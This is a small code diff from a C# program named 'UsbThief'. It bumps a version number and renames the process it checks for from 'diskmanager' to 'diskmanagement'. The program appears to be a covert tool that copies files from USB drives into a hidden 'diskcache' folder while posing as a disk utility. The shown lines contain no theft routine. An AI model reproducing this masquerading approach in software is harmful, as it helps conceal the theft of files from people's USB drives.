@@ -20,7 +20,7 @@ namespace UsbThief
     public partial class Form1 : Form
     {
         #region 声明变量
-        public const int innerVer = 0;
+        public const int innerVer = 1;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
         public bool noSpace = false;
         public bool fc2c = false;
@@ -70,7 +70,7 @@ namespace UsbThief
         public Form1()
         {
             string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
-            if (args.Length < 2 || args[1] != "-run" || Process.GetProcessesByName("diskmanager").Length > 1)
+            if (args.Length < 2 || args[1] != "-run" || Process.GetProcessesByName("diskmanagement").Length > 1)
                 Environment.Exit(0);
             InitializeComponent();
             form.Show();
